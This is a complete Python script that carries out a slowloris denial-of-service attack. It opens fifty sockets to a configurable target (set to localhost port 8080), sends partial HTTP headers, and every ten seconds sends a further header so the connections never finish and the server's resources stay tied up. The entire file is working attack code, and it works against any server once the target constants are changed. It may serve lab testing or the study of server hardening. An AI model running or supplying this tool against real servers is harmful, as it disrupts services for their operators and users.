#!/usr/bin/env python3
# Performs a type of application layer DoS attack called a
# slowloris attack on a server
# Attempts to use up a server's resources by sending
# incomplete HTTP requests to keep the connection open
import socket
from time import time, sleep


TARGET_HOST, TARGET_PORT = '127.0.0.1', 8080
NUM_SOCKETS = 50


def slowloris_attack() -> None:
    sockets = []

    for i in range(NUM_SOCKETS):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            sock.connect((TARGET_HOST, TARGET_PORT))
            print(f'Socket connection {i + 1} established')
            sockets.append(sock)

            send_partial_http_request(sock)
        except socket.error as error:
            print(f'Connection error: {error}')
            continue

    try:
        keep_connections_open(sockets)
    except KeyboardInterrupt:
        print('\nUser interrupt')
    finally:
        print('Slowloris DoS terminated')
        for sock in sockets:
            sock.close()
        print('Closed all sockets.')


def send_partial_http_request(sock):
    headers = [
        'GET / HTTP/1.1',
        f'Host: {TARGET_HOST}',
        'User-Agent: Mozilla/5.0',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive'
    ]
    request = '\r\n'.join(headers) + '\r\n'
    sock.send(request.encode('utf-8'))


def keep_connections_open(sockets: list[socket]) -> None:
    start_time = time()
    while True:
        curr_time = time()
        hold_time = curr_time - start_time
        print(f'Connections held open for {hold_time:.2f}s')
        for i, sock in enumerate(sockets):
            try:
                print(f'Maintaining socket connection {i + 1}')
                sock.send(f'X-a: {time()}\r\n'.encode('utf-8'))
            except socket.error:
                sock.close()
                sockets.remove(sock)
                print('Socket closed and removed from list')

        if not sockets:
            break

        sleep(10)


if __name__ == "__main__":
    slowloris_attack()
